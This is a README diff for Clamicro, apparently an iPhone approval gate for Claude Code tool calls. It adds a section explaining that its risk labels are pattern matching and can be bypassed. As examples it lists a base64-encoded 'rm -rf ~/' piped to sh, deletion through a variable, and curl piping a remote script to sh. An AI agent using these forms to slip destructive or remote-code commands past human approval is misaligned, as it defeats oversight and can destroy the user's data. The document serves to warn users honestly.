@@ -120,6 +120,36 @@ The fingerprint combines **gateway IP + gateway MAC + subnet**. SSID needs Locat
 | **`SameSite=Lax` + `HttpOnly`** | CSRF, while still keeping you logged in when arriving from another app (`Strict` would force a re-scan every time) |
 | **Per-approval key** | A leaked deep link can only decide that one approval, and expires with it |
 
+### Risk detection is a hint, not a sandbox
+
+The risk levels in this tool come from **pattern matching over the command text** —
+`rm -rf`, force pushes, paths under `~/.ssh`, writes outside the working directory.
+They exist to *pull your attention* to the operations most likely to hurt. They do
+not contain anything, and they are trivially defeated:
+
+```bash
+echo cm0gLXJmIH4v | base64 -d | sh    # the dangerous string never appears
+D=$HOME; rm -rf "$D"                   # indirection through a variable
+curl https://example.com/x.sh | sh     # the payload isn't in the command at all
+./cleanup.sh                           # it's in a file we never see
+```
+
+Nothing here runs in a sandbox. When you approve an operation, it executes with your
+full user privileges — Clamicro only decides *whether* the tool call proceeds, never
+*what it can reach*.
+
+Two consequences worth internalizing:
+
+- **"Normal" doesn't mean safe.** It means no rule matched. A command that reads
+  perfectly innocuous can still delete your work.
+- **The protection is you reading the command**, not the label above it. The label
+  decides how much friction you get (high-risk needs a longer swipe and can't be
+  approved from the list) — that friction is calibrated by a heuristic, so it is
+  a nudge, not a guarantee.
+
+If you need actual containment, that is a different tool: a VM, a container, or
+Claude Code's own permission rules restricting which tools may run at all.
+
 ### In plain terms: that QR code is a key to your Mac
 
 **The token behind it grants permission to approve anything** — `rm -rf`, `sudo`, reading your `~/.ssh/id_rsa`. Treat it like a password:
@@ -219,6 +249,7 @@ Config lives at `~/.claude/clamicro/config.json` (mode 600, contains the token a
 - Plain HTTP isn't a secure context, so no Service Worker or Web Push
 - macOS + iPhone only
 - Pause means "stop at the next interceptable point", not a runtime freeze
+- Risk levels are pattern matching, not containment — see [Risk detection is a hint, not a sandbox](#risk-detection-is-a-hint-not-a-sandbox)
 - The interface is gesture-first; there's currently no equivalent path for VoiceOver users
 - History keeps one day, capped at 300 approvals / 3000 events, oldest dropped
 
